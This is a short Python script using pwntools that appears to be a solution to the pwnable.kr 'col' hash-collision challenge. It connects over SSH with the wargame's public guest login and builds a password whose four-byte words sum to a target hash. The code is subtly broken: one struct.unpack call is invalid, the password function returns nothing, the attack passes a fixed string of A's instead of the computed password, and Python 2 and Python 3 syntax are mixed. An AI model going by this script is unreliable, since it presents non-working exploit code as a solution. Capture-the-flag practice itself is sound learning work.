from pwn import *
import struct

# col
host = 'pwnable.kr'
user = 'col'
password = 'guest'
port = 2222

# Notes
#  * Hash function is simply sum of the (little endian) words of the password

def compute_password():
  hashcode = 0x21DD09EC
  pw = ''
  for i in range(4):
    pw += struct.pack('<i', hashcode // 5)
    hashcode -= hashcode // 5
  pw += struct.pack('<i', struct.unpack('AAA!'))
  print('Password is: {}'.format(pw))


def attack():
  s = ssh(host=host, user=user, password=password, port=port)
  pw = compute_password()
  p = s.process(['./col', 'AAAAAAAAAAAAAAAAAAAA'])
  print p.recvall()

if __name__ == '__main__':
  # compute_password()
  attack()
